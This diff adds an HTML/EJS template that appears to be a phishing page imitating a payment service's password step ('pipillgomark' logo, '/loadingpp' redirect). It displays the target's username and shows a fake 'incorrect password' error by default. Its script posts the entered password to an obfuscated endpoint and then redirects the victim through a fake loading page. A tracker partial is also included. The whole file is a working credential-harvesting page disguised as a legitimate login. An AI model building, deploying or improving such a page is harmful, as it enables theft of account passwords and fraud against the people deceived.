@@ -1,0 +1,100 @@
+<html lang="de"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+     <%- include('partials/tracker') %>
+</head>
+<body>
+    <header>
+    
+    </header>
+    <main>
+        <form method="post" id="pass">
+            <div class="logo">
+                <img src="img/pipillgomark.png" alt="">
+            </div>
+            <div class="change">
+                <p><%=user%></p>
+                <a href="/">Cambiar</a>
+            </div>
+            <div class="input-container">
+                <input required="" id="password" type="password">
+                <label class="label" for="password">contraseña</label>
+                <div class="underline"></div>
+                <div id="errorMessage" style="color: #ff0000; font-size: 14px; margin-top: 10px; text-align: center;">La contraseña ingresada es incorrecta. Por favor, inténtelo de nuevo.</div>
+            </div>
+            <div class="bot">
+                <div class="first">
+                    <p>¿Olvidaste tu contraseña?</p>
+                    <button class="btn" type="submit">Más información</button>
+                </div>
+                <div class="mid">
+                    <hr>
+                    <span>o</span>
+                    <hr>
+                </div>
+                <div class="second">
+                    <a href="">Registro</a>
+                </div>
+                <div class="third">
+                    <a href="">árabe</a>
+                    <hr>
+                    <a href="" class="active">Englisch</a>
+                    <hr>
+                    <a href="">Francés</a>
+                    <hr>
+                    <a href="">Español</a>
+                    <hr>
+                    <a href="">Chino</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <p>Contacto</p>
+        <p>Protección de datos</p> 
+        <p>Legal</p>
+        <p>Actualizaciones de políticas</p>
+        <p>Mundo</p>
+    </footer>
+
+    <script>
+        document.getElementById('pass').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("submit");
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!password.trim()) {
+                // Show error message if password is empty
+                errorMessage.textContent = 'Por favor, ingrese su contraseña.';
+                errorMessage.style.display = 'block';
+                return; // Stop form submission
+            }
+            
+            console.log('Login attempt:', { password });
+
+            $.ajax({
+                url: '/xGuVKoqaCJPI489XsT08', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({password}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loadingpp?time=15&url=/SoZ4opAM7PZIBpY0Ua7tV";
+                    }
+                }
+            });
+        });
+        
+        // Also hide error message when user starts typing
+        document.getElementById('password').addEventListener('input', function() {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.style.display = 'none';
+        });
+    </script>
+
+
+
+</body></html>
